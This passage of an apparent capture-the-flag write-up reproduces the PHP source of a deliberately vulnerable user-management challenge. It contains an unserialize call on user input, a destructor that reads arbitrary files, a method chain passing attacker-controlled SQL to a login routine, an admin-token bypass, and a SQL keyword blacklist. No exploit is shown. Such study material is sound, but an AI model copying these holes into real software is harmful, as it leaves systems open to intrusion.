punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'age'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token variable\">$nickname</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'nickname'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">safe</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$nickname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">nickname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 危</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">nickname</span><span class=\"token operator\">-></span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"0-0\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Info</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$CtrlCase</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$nickname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token operator\">=</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">nickname</span><span class=\"token operator\">=</span><span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>   </pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">CtrlCase</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">Class</span> <span class=\"token class-name-definition class-name\">UpdateHelper</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$newinfo</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$newInfo</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token variable\">$newInfo</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$newInfo</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token variable\">$upDate</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dbCtrl</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$hostname</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"127.0.0.1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dbuser</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"noob123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dbpass</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"noob123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$database</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"noob123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$mysqli</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">mysqli</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">hostname</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dbuser</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dbpass</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">database</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">mysqli</span><span class=\"token operator\">-></span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"连接失败，错误:\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">mysqli</span><span class=\"token operator\">-></span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">mysqli</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">bind_result</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'用户不存在!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'密码错误！'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">update</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>        <span class=\"token comment\">// 还没来得及写</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>login.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'lib.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Content-Type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html; charset=utf-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>login<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>login.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span> 300</span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>百万前端的用户信息管理系统<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h3</span><span class=\"token punctuation\">></span></span>半成品系统 留后门的程序员已经跑路<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h3</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        \t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>username<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UserName<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">required</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span> 20</span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">required</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span>20<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>登录<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>img/1.jpg<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span>大家记得做好防护<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>img</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;br>Damn you, hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Damn you, hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>update.php</p>\n<figure class=\"highlight php\"><figcaption 